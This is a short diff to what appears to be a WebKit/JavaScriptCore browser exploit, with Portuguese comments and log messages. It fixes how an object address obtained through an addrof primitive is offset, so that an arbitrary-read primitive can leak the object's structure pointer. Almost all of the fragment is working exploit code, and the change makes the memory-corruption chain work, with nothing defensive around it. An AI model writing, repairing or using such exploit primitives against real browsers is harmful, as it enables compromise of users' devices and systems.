@@ -97,7 +97,9 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         const victim_addr = addrof(victim_for_corruption);
         logS3(`Endereço do objeto vítima (via addrof): ${victim_addr.toString(true)}`, "leak");
 
-        const structure_addr_ptr = victim_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET);
+         // --- CÓDIGO NOVO E CORRIGIDO ---
+        const offset_para_soma = new AdvancedInt64(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET);
+        const structure_addr_ptr = victim_addr.add(offset_para_soma);
         const original_structure_addr = await arb_read(structure_addr_ptr);
         logS3(`Ponteiro para StructureID original lido em: ${structure_addr_ptr.toString(true)} -> ${original_structure_addr.toString(true)}`, "leak");
         
